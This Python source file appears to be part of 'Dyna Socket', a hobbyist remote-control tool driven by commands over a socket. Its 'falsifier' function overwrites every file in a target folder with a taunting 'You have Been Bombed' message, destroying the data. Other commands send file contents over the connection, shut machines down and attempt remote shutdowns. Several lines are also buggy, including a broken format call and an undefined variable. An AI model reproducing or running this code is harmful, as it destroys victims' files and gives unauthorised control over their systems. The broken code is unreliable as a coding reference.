#!/usr/bin/env python

#----------------------------------------------------------------------------------#
# Project : Dyna Socket                                                            #
# Script  : Functions                                                              #
# Author  : Mrinal Wahal                                                           #
# Website : http://www.dynacrux.de.vu/                                             #
#----------------------------------------------------------------------------------#

import socket, os, threading, sys, glob
    
def falsifier(target,conn):
    import glob,sys,os
    
    try:
        empty = []
        for file in glob.glob(target + "/*"):
            conn.send("\nScanning " + file)
            empty.append(file)
                
        for name in empty:
            filename = open(name,"w")
            filename.write("You have Been Bombed By Dyna Socket.\n")
            filename.write("It is Okay! Shit Happens ! Better Luck Next Time Grasshopper. ;)(Updated)")
            filename.close()
            
        conn.send("Falsification Complete.")
            
    except Exception as e:
        conn.send(str(e))
        pass
    
def perm_falsifier(conn):
    
    print("Aknowledged. Now Send The Target.")
    perm = input("""\nWarning - Any Changes Made To The Files Will Not Be Reverted.
          Also Any Non-Text File Will Be Corrupted.
          Are You Sure You Want To Continue ?(Y/N) - """)
    if perm == "Y" or perm == "y":
        target = input("Enter The Target Folder : ")
        conn.send("Incoming Target.")
        conn.send(target)
    else:
        pass
        
def sendfile():
        filename = input("Enter The File Path : ")
        user_file = open(filename,'r+')
        read_file = user_file.read()
        return read_file
        filename.close()

def commands(server_prompt, conn,s):
    if server_prompt == "<send file>":
        try:
            usrfile = sendfile()
            conn.send("\n" + usrfile)
        except Exception as e:
            print(f"Error : {str(e)}")
    elif server_prompt == "<exit>":
        print("See Ya, Houstan !")
        s.close()
        print("-"*60)
        sys.exit()
    elif server_prompt == "<sys shutdown>":
        print("See Ya, Houstan !")
        s.close()
        print("-"*60)
        sys.exit()
        os.system("shutdown -s -t 2")
    elif server_prompt == "<terminal>":
        os.system('start "Dyna Socket" cmd.exe')
    elif server_prompt == "<ipconfig>":
        os.system("ipconfig")
    elif server_prompt == "<remote shutdown>":
        target = input("Target : ")
        if target == "client":
            for sock in connlist:            
                target = sock
        os.system("shutdown /m \\%") % target
    elif server_prompt == "<watch starwars>":
        os.system("telnet towel.blinkenlights.nl.")
    elif server_prompt == "~help~":
        filename = open("Help.txt","r+")
        print(filename.read())
    elif server_prompt == "<launch falsifier>":
        perm_falsifier(conn)
    else:
        conn.send(server_prompt)
